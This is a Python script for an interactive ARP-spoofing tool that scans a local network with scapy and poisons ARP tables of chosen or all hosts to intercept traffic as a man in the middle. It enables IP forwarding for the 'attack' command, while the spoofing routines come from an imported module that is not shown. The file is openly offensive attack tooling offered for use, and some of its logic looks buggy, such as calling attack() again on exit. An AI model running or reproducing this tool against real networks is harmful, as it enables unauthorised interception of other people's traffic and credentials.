from pwn import log
from scapy.all import *
import sys
import argparse
from tabulate import tabulate
from tables.tables import *
import os

import netifaces

print("""


|-----------------------------------------------------------------------|
||                                                                     ||
||       _    ____  ____  ____  ____   ___   ___  _____ _____ ____     ||
||      / \  |  _ \|  _ \/ ___||  _ \ / _ \ / _ \|  ___| ____|  _ \    ||
||     / _ \ | |_) | |_) \___ \| |_) | | | | | | | |_  |  _| | |_) |   ||
||    / ___ \|  _ <|  __/ ___) |  __/| |_| | |_| |  _| | |___|  _ <    ||
||   /_/   \_|_| \_|_|   |____/|_|    \___/ \___/|_|   |_____|_| \_\   ||
||                                                                     ||
||                                                                     ||
||   By: xalvarex                                                      ||
||   Github: https://github.com/xalvarex/                              ||
||                                                                     || 
|-----------------------------------------------------------------------|


arpscan --network 192.168.0.0/24                (Scan the provided network)
hosts                                           (Show the hosts found)
arptable --target 192.168.0.2                   (Show arp table of target)
spoof --target 192.168.0.3                      (Spoof arp table of target)
mitm --target 192.168.0.3 192.168.0.1           (Intercept trafic between 2 targets)
spoofall                                        (Spoof arp tables of all hosts)
restore                                         (Restore all arp tables)

attack                                          (Apply arp tables and execute attack)

""")

host_list = []
    
arptables = {}
adapter = False
    



def arp_scan(network):
    
    hosts_up = []

    conf.verb = 0

    print("Scanning network (ARP)...")
    
    up, down = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = network), timeout = 3, iface = adapter, inter = 0.1)

    for snd,rcv in up:
        IP = str(rcv).split(' ')[7]
        MAC = str(rcv).split(' ')[5]
        hosts_up.append([IP, MAC, False])
        
            
    return hosts_up
        
    
  
def show_hosts(host_list):
    
    header = ["IP", "MAC", "HACKED"]

    print(tabulate(host_list, headers = header,  tablefmt="grid"))
       

        

        

adapter = sys.argv[1]

attacker_ip = netifaces.ifaddresses(adapter)[2][0]["addr"]    
attacker_mac = netifaces.ifaddresses(adapter)[17][0]["addr"]
attacker_addr = [attacker_ip, attacker_mac]

        
        
while adapter:

    #Read input user
    args = input("\n\n> ").strip().split(' ')

    arg_parser = argparse.ArgumentParser(usage ="""

    arpscan --network 192.168.0.0/24                (Scan the provided network)
    hosts                                           (Show the hosts found)
    arptable --target 192.168.0.2                   (Show arp table of 1 target before exec attack)
    spoof --target 192.168.0.3                      (Spoof arp table of 1 target)
    mitm -t 192.168.0.3 -t2 192.168.0.1             (Intercept trafic between 2 targets)
    spoofall                                        (Spoof arp tables of all hosts)
    restore                                         (Restore all arp tables)

    attack                                          (Apply arp tables and execute attack)
    """)


    arg_parser.add_argument("action", help="arpscan, hosts, arptable, spoof, mitm, attack")
    arg_parser.add_argument("-t", "--target")
    arg_parser.add_argument("-t2", "--target2")
    arg_parser.add_argument("-n", "--network")
     
    try: 
        args = arg_parser.parse_args(args)
        action = args.action
        target_ip = args.target
        target_ip2 = args.target2
        network = args.network
    except:
        print(args)
        print("Invalid arguments")
        continue


    

      

        
    if action == "arpscan":
        host_list = arp_scan(network)
        show_hosts(host_list)
        
        for addr in host_list:
            arptables[addr[0]] = arptable(copy.deepcopy(host_list), copy.deepcopy(addr), attacker_addr)

        
    if action == "hosts":
        show_hosts(host_list)
    
    if action == "spoof":
        arptables[target_ip].spoof_v()

    if action == "arptable":
        arptables[target_ip].show()

    if action == "mitm":
        arptables[target_ip].spoof(target_ip2)
        arptables[target_ip2].spoof(target_ip)

    if action == "spoofall":
        for addr in host_list:
            arptables[addr[0]].spoofall()

    if action == "restore":
        for addr in host_list:
            arptables[addr[0]].restore(copy.deepcopy(host_list))
            

    if action == "attack":
        os.system("echo 1 | tee /proc/sys/net/ipv4/ip_forward")
        for addr in host_list:
            arptables[addr[0]].attack()


    if action == "exit":
        os.system("echo 0 | tee /proc/sys/net/ipv4/ip_forward")
        for addr in host_list:
            arptables[addr[0]].restore(copy.deepcopy(host_list))
        for addr in host_list:
            arptables[addr[0]].attack()

        print("Exiting and restoring tables")
        break


    
        








    





    

    

    
        




    
    


    

    
        
   

        

        

        

        
        

        
        

        

        
        


        





    
            

